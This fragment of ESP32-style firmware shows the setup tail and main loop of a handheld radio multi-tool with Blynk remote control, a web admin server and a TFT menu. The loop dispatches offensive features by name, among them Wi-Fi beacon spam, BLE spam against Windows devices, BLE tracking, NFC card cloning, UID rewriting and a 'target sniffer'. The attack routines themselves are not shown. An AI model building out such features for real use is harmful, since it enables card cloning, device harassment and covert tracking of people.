  WiFi.mode(WIFI_STA);
  WiFi.begin(ssid, pass);
  int tries = 0;
  while (WiFi.status() != WL_CONNECTED && tries < 30) { delay(500); Serial.print("."); tries++; }
  if (WiFi.status() == WL_CONNECTED) {
    addLog("Home Wi‑Fi connected! IP: " + WiFi.localIP().toString());
    Blynk.config(BLYNK_AUTH_TOKEN);
    Blynk.connect();
    addLog("Blynk connected");
  } else {
    addLog("Home Wi‑Fi failed – Blynk won't work");
  }

  server.on("/admin", HTTP_GET, handleAdmin);
  server.on("/api/run", HTTP_GET, handleApiRun);
  server.on("/api/stop", HTTP_GET, handleApiStop);
  server.on("/api/status", HTTP_GET, handleApiStatus);
  server.on("/api/logs", HTTP_GET, handleApiLogs);
  server.begin();
  webServerStarted = true;
  addLog("Web admin at http://" + WiFi.localIP().toString() + "/admin");

  tft.init(240, 320);
  tft.setRotation(1);
  tft.invertDisplay(false);
  drawMenu();
}

// ==================== Main Loop ====================
void loop() {
  Blynk.run();
  if (webServerStarted) server.handleClient();

  if (featureRunning) {
    if (currentFeature == "wifi_scan") runWiFiScan();
    else if (currentFeature == "beacon") runWiFiBeacon();
    else if (currentFeature == "ble_spam") runBLEWindowsSpam();
    else if (currentFeature == "ble_track") runBLETracker();
    else if (currentFeature == "nfc_read") runNFCRead();
    else if (currentFeature == "nfc_clone") runNFCClone();
    else if (currentFeature == "manual_uid") runManualUIDUpdate();
    else if (currentFeature == "signal_tracker") runSignalTracker();
    else if (currentFeature == "sniffer") runTargetSniffer();
    // Reset state
    featureRunning = false;
    currentFeature = "";
    Blynk.virtualWrite(V0, 0); Blynk.virtualWrite(V1, 0);
    Blynk.virtualWrite(V2, 0); Blynk.virtualWrite(V3, 0);
    Blynk.virtualWrite(V4, 0); Blynk.virtualWrite(V5, 0);
    Blynk.virtualWrite(V6, 0); Blynk.virtualWrite(V7, 0);
    Blynk.virtualWrite(V8, 0); Blynk.virtualWrite(V9, 0);
    Blynk.virtualWrite(VP_STATUS, "Idle");
    drawMenu();
  }

  // Serial commands
  if (Serial.available()) {
    char cmd = Serial.read();
    while (Serial.available()) Serial.read();
    if (cmd == '1') { addLog("Serial: start WiFi Scan"); runWiFiScan(); }
    else if (cmd == '2') { addLog("Serial: start Beacon"); runWiFiBeacon(); }
    else if (cmd == '3') { addLog("Serial: start BLE Spam"); runBLEWindowsSpam(); }
    else if (cmd == '4') { addLog("Serial: start BLE Track"); runBLETracker(); }
    else if (cmd == '5') { addLog("Serial: start NFC Read"); runNFCRead(); }
    else if (cmd == '6') { addLog("Serial: start NFC Clone"); runNFCClone(); }
    else if (cmd == 'u') { addLog("Serial: start Manual UID"); runManualUIDUpdate(); }
    else if (cmd == '7') { addLog("Serial: start Signal Tracker"); runSignalTracker(); }
    else if (cmd == '8') { addLog("Serial: start Sniffer"); runTargetSniffer(); }
    else if (cmd == 'm') { drawMenu(); }
    else if (cmd == 's') { addLog("Serial: stop command"); stopFlag = true; }
    else drawMenu();
  }
}
